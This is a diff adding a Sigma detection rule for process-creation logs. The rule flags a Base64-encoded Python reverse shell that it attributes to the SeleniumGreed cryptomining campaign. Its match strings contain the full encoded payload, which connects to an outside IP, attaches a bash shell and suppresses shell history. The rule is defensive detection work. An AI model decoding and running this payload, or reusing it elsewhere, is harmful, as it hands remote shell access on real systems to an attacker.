@@ -1,0 +1,28 @@
+title: SeleniumGreed Python Reverse Shell Execution
+id: 597a7a30-c32f-45a8-ac30-5899dd3eb084
+status: experimental
+description: Detects the execution of a specific Base64-encoded Python reverse shell used by the SeleniumGreed campaign to gain initial access.
+references:
+    - https://www.wiz.io/blog/seleniumgreed-cryptomining-exploit-attack-flow-remediation-steps
+author: ioc-yara-daily (agentic)
+date: 2026-10-26
+tags:
+    - attack.execution
+    - attack.t1059.004
+    - attack.t1059.006
+logsource:
+    category: process_creation
+    product: linux
+detection:
+    selection:
+        Image|endswith: '/python3'
+        CommandLine|contains|all:
+            - '-c b=b'
+            - 'aW1wb3J0IG9zLHB0eSxzb2NrZXQ7cz1zb2NrZXQuc29ja2V0KCk7cy5jb25uZWN0KCgnMTY0LjkwLjE0OS4xMDQnLDkwMjEpKTtbb3MuZHVwMihzLmZpbGVubygpLGYpZm9yIGYgaW4oMCwxLDIpXTtvcy5wdXRlbnYoJ0hJU1RGSUxFJywnL2Rldi9udWxsJyk7b3MucHV0ZW52KCdUVFQnLCcxOTIuMjQxLjE0NC42OTo0NDQ3Jyk7cHR5LnNwYXduKCcvYmluL2Jhc2gnKTtzLmNsb3NlKCk='
+            - 'import base64;exec(base64.b64decode(b).decode())'
+            - '--enable-automation'
+            - '--test-type=webdriver'
+    condition: selection
+falsepositives:
+    - Unlikely
+level: critical
